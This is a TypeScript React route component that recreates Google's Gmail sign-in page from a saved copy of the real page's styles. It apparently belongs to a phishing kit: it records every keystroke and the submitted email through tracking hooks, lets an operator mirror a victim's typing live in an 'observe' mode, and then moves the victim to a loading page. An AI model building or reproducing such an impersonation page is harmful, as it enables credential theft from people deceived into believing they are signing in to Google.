import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import {
  GeFontStyle,
  GoogleGLogo,
  useGeTracking,
} from "@/components/ge/GeShared";
import signinHtml from "@/designs/ge/signin.html?raw";

export const Route = createFileRoute("/ge/signin")({
  head: () => ({
    meta: [
      { title: "Sign in - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeSignInPage,
});

/** Exact CSS from the user's SingleFile dump recreation (designs/ge/signin.html). */
function extractCss(html: string): string {
  const m = html.match(/<style>([\s\S]*?)<\/style>/i);
  let css = m?.[1] ?? "";
  // Dump scopes dark tokens to body.AfoeCd — apply them to the React page root.
  css = css.replace(/body\.AfoeCd/g, "html, body, .S7xv8");
  css = css.replace(
    /html,\s*body\s*\{/,
    "html, body { color-scheme: dark !important;",
  );
  return css;
}

const GE_SIGNIN_CSS = extractCss(signinHtml);

function GeSignInPage() {
  const { trackClick, trackInput, trackSubmit, geNavigate, sessionId, isObserve } =
    useGeTracking();
  const [email, setEmail] = useState("");
  const emailRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    setTimeout(() => emailRef.current?.focus(), 200);
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (
        d.field === "email" ||
        d.field === "identifier" ||
        d.field === "Email or phone" ||
        d.field === "Email"
      ) {
        setEmail(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const canContinue = email.trim().length > 0;

  const handleNext = (e?: React.FormEvent) => {
    e?.preventDefault();
    if (!canContinue) return;
    trackClick("Next");
    trackSubmit("email", email.trim());
    geNavigate("/ge/loading");
  };

  return (
    <>
      <GeFontStyle />
      <style>{GE_SIGNIN_CSS}</style>
      <div className="S7xv8">
        <div className="TcuCfd NQ5OL">
          <main className="Svhjgc">
            <div className="zIgDIc">
              <div className="Wf6lSd">
                <GoogleGLogo width={48} height={48} />
              </div>
              <div className="ObDc3">
                <h1 className="vAV9bf">Sign in</h1>
                <div className="gNJDp">to continue to Gmail</div>
              </div>
            </div>

            <div className="UXFQgc">
              <form
                className="qWK5J"
                onSubmit={handleNext}
                autoComplete="off"
                style={{ display: "flex", flexDirection: "column", flexGrow: 1 }}
              >
                <div className={`field${email ? " has-value" : ""}`} id="emailField">
                  <input
                    ref={emailRef}
                    id="identifierId"
                    name="email"
                    type="email"
                    autoComplete="username"
                    spellCheck={false}
                    autoCapitalize="none"
                    aria-label="Email or phone"
                    value={email}
                    onChange={(e) => {
                      const v = e.target.value;
                      setEmail(v);
                      trackInput("email", v);
                    }}
                  />
                  <label className="AxOyFc snByac" htmlFor="identifierId">
                    Email or phone
                  </label>
                  <div className="outline mIZh1c" aria-hidden="true" />
                  <div className="outline-focus cXrdqd" aria-hidden="true" />
                </div>

                <div className="dMNVAe">
                  <button
                    type="button"
                    className="linkish"
                    onClick={() => trackClick("Forgot email?")}
                  >
                    Forgot email?
                  </button>
                </div>

                <div className="RDsYTb">
                  Not your computer? Use Guest mode to sign in privately.{" "}
                  <a
                    href="https://support.google.com/chrome/answer/6130773?hl=en"
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    Learn more about using Guest mode
                  </a>
                </div>

                <div className="JYXaTc">
                  <div className="O1Slxf">
                    <div className="TNTaPb">
                      <button
                        type="submit"
                        className="btn btn-next AjY5Oe Jskylb"
                        disabled={!canContinue}
                      >
                        Next
                      </button>
                    </div>
                    <div className="FO2vFd">
                      <button
                        type="button"
                        className="btn btn-create lKxP2d eR0mzb"
                        onClick={() => trackClick("Create account")}
                      >
                        Create account
                      </button>
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </main>
        </div>

        <div className="wmGw4">
          <footer className="FZfKCe">
            <div className="lang">English (United States)</div>
            <ul className="HwzH1e">
              <li className="qKvP1b">
                <a
                  className="AVAq4d"
                  href="https://support.google.com/accounts?hl=en"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Help
                </a>
              </li>
              <li className="qKvP1b">
                <a
                  className="AVAq4d"
                  href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Privacy
                </a>
              </li>
              <li className="qKvP1b">
                <a
                  className="AVAq4d"
                  href="https://accounts.google.com/TOS?loc=US&hl=en"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Terms
                </a>
              </li>
            </ul>
          </footer>
        </div>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </>
  );
}
